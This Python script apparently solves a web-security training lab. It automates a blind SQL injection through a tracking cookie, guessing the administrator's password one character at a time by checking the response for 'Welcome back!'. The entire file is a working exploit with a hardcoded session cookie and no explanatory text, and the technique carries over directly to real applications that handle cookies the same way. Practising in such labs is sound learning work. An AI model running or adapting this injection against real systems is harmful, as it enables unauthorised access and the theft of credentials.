import requests
from string import printable
flag = ''
for j in range(1,10):
    for i in printable:
        url = "https://0aae00b80342277f8090ad7f008c003e.web-security-academy.net/filter?category=Gifts"

        headers = {
            f"Cookie": "TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,{j},1)+FROM+users+WHERE+username='administrator')='{i}; session=1FnpvEIvYtAxBVy9yKegunoiZxZBhPQy",
            "Sec-Ch-Ua": "",
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://0aae00b80342277f8090ad7f008c003e.web-security-academy.net/filter?category=Corporate+gifts",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9"
        }
        response = requests.get(url, headers=headers)
        if 'Welcome back!' in response.text:
            flag += i
            print(flag)
            break

# print(response.text)
